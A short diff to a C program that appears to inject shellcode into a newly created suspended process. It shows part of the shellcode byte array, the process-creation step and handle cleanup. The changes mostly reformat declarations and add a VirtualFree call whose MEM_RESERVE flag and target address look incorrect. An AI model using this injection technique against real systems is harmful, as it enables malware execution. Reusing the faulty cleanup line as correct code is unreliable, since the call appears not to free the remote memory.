@@ -34,10 +34,11 @@ int main()
 0x63,0x2e,0x65,0x78,0x65,0x00
 	};
 
-	HANDLE		hProcess = NULL, hThread = NULL;
-	DWORD		dwProcessId = NULL;
-	PVOID		pAddress = NULL;
-	size_t shellsize = sizeof(Shellcode);
+	HANDLE		hProcess	= NULL, 
+				hThread		= NULL;
+	DWORD		dwProcessId = 0;
+	PVOID		pAddress	= NULL;
+	size_t		shellsize	= sizeof(Shellcode);
 
 	INFO("Creating Suspended process of: %s...", TARGET);
 	if (!CreateSuspendedProcess(TARGET, &hProcess, &hThread, &dwProcessId))
@@ -66,6 +67,9 @@ int main()
 		CloseHandle(hProcess);
 	if (hThread)
 		CloseHandle(hThread);
+
+	if (pAddress)
+		VirtualFree(pAddress, 0, MEM_RESERVE);
 
 	CHAR("Quit...");
 	getchar();
